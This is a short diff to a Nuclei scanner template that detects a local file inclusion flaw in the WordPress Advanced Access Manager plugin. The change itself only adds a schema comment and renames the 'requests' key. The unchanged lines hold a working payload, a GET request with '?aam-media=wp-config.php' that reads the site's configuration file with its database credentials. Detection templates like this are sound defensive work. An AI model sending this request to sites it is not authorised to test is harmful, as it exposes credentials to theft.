@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: advanced-access-manager-plugin-lfi
 
 info:
@@ -7,7 +8,7 @@ info:
   tags: wordpress,wp-plugin,lfi,wp
   reference: https://wpscan.com/vulnerability/9873
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/?aam-media=wp-config.php '
